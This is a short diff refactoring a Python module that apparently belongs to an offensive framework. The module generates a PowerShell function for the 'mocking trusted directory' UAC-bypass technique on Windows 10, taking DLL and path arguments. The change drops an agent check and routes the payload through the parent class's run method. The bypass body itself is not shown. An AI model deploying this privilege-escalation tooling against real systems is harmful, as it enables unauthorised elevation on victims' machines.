@@ -1,5 +1,4 @@
 from termcolor import colored, cprint
-from warrior_check import exist_warrior
 from module import Module
 
 
@@ -20,8 +19,7 @@ class CustomModule(Module):
 
     # This module must be always implemented, it is called by the run option
     def run_module(self):
-        if exist_warrior(self.args["warrior"]):
-            function = """function invoke-mockingtrusteddirectory{{
+        function = """function invoke-mockingtrusteddirectory{{
 
 if((Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion").ProductName -like '*Windows 10*')
 {{
@@ -36,12 +34,5 @@ if((Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion").P
 
 }}""".format(self.args["common-control"],self.args["base"],self.args["dll"])
             
-            function += 'invoke-mockingtrusteddirectory'
-
-            with open('/tmp/ibs-{}'.format(self.args["warrior"]), 'a') as f:
-                f.write(function)
-
-            cprint ('[+] Done!', 'green')
-
-        else:
-            cprint ('[!] Failed... Warrior don´t found', 'red')
+        function += 'invoke-mockingtrusteddirectory'
+        super(CustomModule, self).run(function)
